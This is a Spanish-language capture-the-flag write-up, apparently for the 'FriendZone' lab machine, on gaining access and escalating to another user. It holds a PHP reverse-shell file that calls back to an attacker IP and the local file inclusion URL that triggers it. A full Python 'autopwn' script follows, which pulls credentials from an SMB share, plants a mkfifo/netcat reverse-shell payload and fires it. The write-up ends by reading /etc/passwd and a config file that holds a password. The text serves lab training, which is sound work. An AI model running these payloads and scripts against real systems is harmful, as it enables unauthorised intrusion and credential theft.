## Vuln exploit & Gaining Access {-}

### Ganando accesso con un un LFI {-}

1. Creamos un fichero reverse.php

    ```php
    <?php
        system("bash -c 'bash -i >& /dev/tcp/10.10.14.8/443 0>&1'");
    ?>
    ```

1. Con smbclient, subimos el fichero

    ```bash
    put reverse.php
    ```

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. En el dashboard, intentamos ver si vemos la pagina

    ```bash
    https://administrator1.friendzone.red/dashboard.php?image_id=a&pagename=/../../../../../etc/Development/reverse
    ```

Ya hemos ganado acceso al systema.

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### Creando un autopwn en python {-}

```python
#!/usr/bin/python3

import pdb
import urllib3
import urllib

from smb.SMBHandler import SMBHandler

from pwn import *

def def_handler(sig, frame):

    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "https://administrator1.friendzone.red/login.php"
rce_url = "https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/reverse"
lport = 443

def getCreds():
    opener = urllib.request.build_opener(SMBHandler)
    fh = opener.open('smb://10.10.10.123/general/creds.txt')
    data = fh.read()
    fh.close()

    data = data.decode('utf-8')
    username = re.findall(r'(.*?):', data)[1]
    password = re.findall(r':(.*)', data)[1]

    return username, password

def makeRequest(username, password):

    urllib3.disable_warnings()

    s = requests.session()
    s.verify = False

    data_post = {
        'username': username,
        'password': password
    }

    r = s.post(login_url, data=data_post)

    os.system("mkdir /mnt/montura")
    os.system('mount -t cifs //10.10.10.123/Development /mnt/montura -o username="null",password="null",domain="WORKGROUP",rw')
    time.sleep(2)
    os.system("echo \"<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f'); ?>\" > /mnt/montura/reverse.php")
    os.system("umount /mnt/montura")
    time.sleep(2)
    os.system("rm -r /mnt/montura")

    r = s.get(rce_url)

if __name__ == '__main__':

    username, password = getCreds()

    try:
        threading.Thread(target=makeRequest, args=(username, password)).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()

    shell.interactive()
```

### Userpivoting {-}

```bash
grep "sh$" /etc/passwd
pwd
ls -l
cat mysql_data.conf
```

Vemos la contraseña del usuario friend y nos podemos convertir con el comando `su friend` y leer la flag.
